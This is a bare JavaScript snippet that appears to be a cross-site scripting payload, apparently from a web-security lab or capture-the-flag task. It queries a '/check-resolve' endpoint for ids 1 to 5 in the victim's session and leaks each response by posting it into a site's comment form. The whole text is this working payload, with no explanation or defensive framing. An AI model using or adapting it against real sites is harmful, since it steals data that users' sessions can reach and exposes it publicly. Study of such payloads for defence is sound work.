(async () => {
  for (let id = 1; id <= 5; id++) {
    const txt = await fetch('/check-resolve', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `id=${id}`
    }).then(res => res.text());

    const r = await fetch('/post-comment', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'comment-author=test' + txt + '&comment2=test' + txt
    });
  }
})();
